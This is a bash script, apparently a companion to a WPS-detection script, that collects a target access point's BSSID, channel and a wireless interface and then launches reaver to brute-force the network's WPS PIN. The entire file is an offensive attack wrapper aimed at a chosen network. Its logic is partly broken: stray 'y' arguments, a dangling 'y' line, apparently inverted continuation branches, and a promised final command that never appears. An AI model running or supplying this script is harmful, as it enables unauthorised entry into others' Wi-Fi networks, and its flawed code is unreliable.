#! /bin/bash


#######################################
#
#This script is used in conjuction with
#4_wash_wps_detector.sh this should be
#run after that script and after you
#have collected the bssid, essid and
#channel of the target network with
#wash
#
#######################################


###COLLECT INFO FROM USER
echo "Welcome to the auto-reaver script"
echo "This script is designed to run reaver as quickly as possible."
echo "Unfortunatly, due to some features of reaver, such as the"
echo "ability to save progress and continue at a later date, this "
echo "script won't be able to run more than once against the same AP"
echo "yet. To compensate, at the end of the runtime there will be a"
echo "command that you simply CTRL+SHIFT+C after selecting to copy."
echo -e "CTRL+SHIFT+V will paste that command into a terminal.\n\n\n"
sleep 1
### set to one for debug
### make sure to set this back to 20

echo "Please enter the interface you wish to use:"
read WIFIINTERFACE
echo -e "\n"

echo "Now enter the bssid (AP mac) of target:"
read APBSSID
echo -e "\n"

echo "Enter the channel:"
read APCHANNEL
echo -e "\n"

echo "Would you like to run reaver (Q)uietly or (V)erbose?"
read VERBOSEORNOT
echo -e "\n"

echo "Is this a continuation of a previous reaver attack?"
read CONTINUATION
echo -e "\n"


case $VERBOSEORNOT in

###check for verbosity quiet
[Qq] )  ###then check continuation or not
	if [ "$CONTINUATION" = "Y" ] || [ "$CONTINUATION" = "y" ]; then
	reaver -i $WIFIINTERFACE -b $APBSSID -c $APCHANNEL -q

	### to answer the question of continue or not
	
	else
	reaver -i $WIFIINTERFACE -b $APBSSID -c $APCHANNEL -q y
	###no continue

	fi ###end of if
;;

###check for verbosity yes
[Vv] ) ###then check if continuation or not
	if [ "$CONTINUATION" = "Y" ] || [ "$CONTINUATION" = "y" ]; then
	reaver -i $WIFIINTERFACE -b $APBSSID -c $APCHANNEL -vv y
	y
	### yes to continue with crack
	
	else
	reaver -i $WIFIINTERFACE -b $APBSSID -c $APCHANNEL -vv
	### nothing, it wont ask if its not a continue

	fi ### end of if

;;


esac












